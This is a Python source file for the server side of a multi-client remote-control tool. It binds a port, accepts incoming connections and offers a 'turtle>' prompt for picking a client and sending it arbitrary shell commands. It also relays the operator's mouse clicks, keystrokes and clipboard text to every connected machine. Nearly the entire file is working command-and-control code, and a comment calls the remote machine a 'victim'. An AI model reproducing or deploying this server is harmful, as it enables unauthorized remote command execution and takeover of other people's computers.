import socket
import threading
import traceback
from queue import Queue
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from pynput.keyboard import Key, KeyCode
import pyperclip

NUMBER_OF_THREADS = 6
JOB_NUMBER = [1, 2, 3, 4, 5, 6]
queue = Queue()
all_connections = []
all_address = []
global x_click
global y_click
global enable_send_click
global keys_to_send
global keys_is_pressing
global enable_send_key


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'enable_click' in cmd:
            global enable_send_click
            enable_send_click = True
            print('Enable send click to client successfully')
        elif 'enable_key' in cmd:
            global enable_send_key
            global keys_to_send
            while not keys_to_send.empty():
                keys_to_send.get()
            enable_send_key = True
            print('Enable send key to client successfully')
        else:
            print("Command not recognized")


def start_send_click():
    is_logged = False
    while True:
        global x_click
        global y_click
        global enable_send_click
        if x_click and y_click and enable_send_click:
            if not is_logged:
                print('Thread send click running')
                is_logged = True
            for conn in all_connections:
                send_target_commands_click(conn, x=x_click, y=y_click)
            print("Send_click_Success")
            x_click = None
            y_click = None


def start_send_keys():
    is_logged = False
    while True:
        global keys_to_send
        global enable_send_key
        if not keys_to_send.empty() and enable_send_key:
            key = keys_to_send.get()
            if not is_logged:
                print('Thread send key running')
                is_logged = True
            for conn in all_connections:
                send_target_commands_keys(conn, key=key)
            print("Send_click_Success")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            print(f'Error connect to {all_address[i][0]} ! Deleting')
            del all_connections[i]
            del all_address[i]
            print(f'Delete {all_address[i][0]} done')
            continue

        results = results + str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


def send_target_commands_click(conn, x, y):
    cmd = f'cl {x} {y}'
    try:
        if len(str.encode(cmd)) > 0:
            print(str.encode(cmd))
            conn.send(str.encode(cmd))
            # client_response = str(conn.recv(1024), "utf-8")
            # print(client_response, end="")
    except Exception as err:
        traceback.print_exc()
        print("Error sending commands click")


def send_target_commands_keys(conn, key):
    cmd = f'pr {key}'
    try:
        if len(str.encode(cmd)) > 0:
            print(str.encode(cmd))
            conn.send(str.encode(cmd))
            # client_response = str(conn.recv(1024), "utf-8")
            # print(client_response, end="")
    except Exception as err:
        traceback.print_exc()
        print("Error sending commands keys")


def start_listen_click():
    def on_click(x, y, button, pressed):
        global enable_send_click
        if pressed and enable_send_click:
            global x_click
            global y_click
            print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
            x_click = x
            y_click = y

    with MouseListener(on_click=on_click) as listener:
        listener.join()


def start_listen_key():
    def on_press(key):
        global keys_is_pressing
        global enable_send_key
        if enable_send_key:
            try:
                print('alphanumeric key {0} pressed'.format(
                    str(key.char).encode()))
                print(str(key.char).encode())
                keys_is_pressing.put(str(key.char).encode())
            except AttributeError:
                print('special key {0} pressed'.format(
                    key))
                if key == Key.backspace:
                    keys_is_pressing.put('backspace'.encode())
                if key == Key.enter:
                    keys_is_pressing.put('enter'.encode())
                if key == Key.space:
                    keys_is_pressing.put('space'.encode())
                if key == Key.ctrl_l:
                    keys_is_pressing.put('ctrl')

    def on_release(key):
        global keys_to_send
        global keys_is_pressing
        global enable_send_key
        if enable_send_key:
            if not keys_is_pressing.empty():
                key_get = keys_is_pressing.get()
                if 'ctrl' == key_get:
                    if not keys_is_pressing.empty():
                        check_key = keys_is_pressing.get()
                        print(check_key)
                        if b'\x03' == check_key:
                            s = pyperclip.paste()
                            print(s)
                            pyperclip.copy(s)
                            keys_to_send.put(f'cpy {s}')
                            print('copy')
                        elif b'\x16' == check_key:
                            keys_to_send.put(f'pst')
                            print('paste')
                else:
                    keys_to_send.put(key_get)

    with KeyboardListener(
            on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        if x == 3:
            start_send_click()
        if x == 4:
            start_listen_click()
        if x == 5:
            start_listen_key()
        if x == 6:
            start_send_keys()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


def main():
    if __name__ == '__main__':
        global enable_send_click
        global x_click
        global y_click
        enable_send_click = False
        global keys_to_send
        global keys_is_pressing
        keys_to_send = Queue()
        keys_is_pressing = Queue()
        global enable_send_key
        enable_send_key = False
        x_click = None
        y_click = None
        create_workers()
        create_jobs()


main()
